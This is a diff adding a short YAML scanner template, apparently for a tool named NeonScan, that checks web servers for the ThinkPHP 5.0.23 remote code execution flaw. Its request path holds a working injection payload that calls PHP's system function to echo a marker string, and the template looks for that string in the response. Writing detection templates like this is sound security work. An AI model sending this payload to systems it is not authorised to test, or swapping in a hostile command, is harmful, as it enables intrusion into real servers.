@@ -1,0 +1,9 @@
+name: ThinkPHP-5-0-23-RCE-InvokeFunction
+steps:
+  - method: GET
+    path: '/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20ThinkPHP_RCE_Success'
+    headers:
+      User-Agent: NeonScan
+    validate:
+      status: [200, 500]
+      bodyContains: ["ThinkPHP_RCE_Success"]
